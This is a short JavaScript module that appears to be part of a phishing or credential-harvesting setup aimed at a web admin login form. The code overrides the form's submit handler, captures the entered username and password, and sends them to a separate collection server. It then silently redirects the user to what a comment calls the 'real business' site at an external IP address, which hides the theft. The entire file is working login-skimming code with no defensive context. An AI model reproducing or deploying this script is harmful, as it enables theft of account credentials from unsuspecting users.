console.log("Loaded GetFormData Module ...");

export function GetFormData(){
    var click = document.getElementById("submit");
    click.removeAttribute("onclick");
    click.addEventListener("click",()=>{
        var username = document.getElementById("LAY-user-login-username").value;
        var password = document.getElementById("LAY-user-login-password").value;
        
        // 构建要发送的数据对象
        var data = {
            username: username,
            password: password
        };

        // 使用 Fetch API 发送数据到服务器
        fetch('http://127.0.0.1:8080/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(data => {
            // 这里可以处理服务器响应的数据
            console.log(data);
            loginButtonOnClickHandler();
        })
        .catch(error => {
            // 处理错误
            console.error('Error:', error);
        });
    })
}

function loginButtonOnClickHandler() {
    // 重定向到真实业务
    window.location.href = "http://122.4.221.133:8082/";
}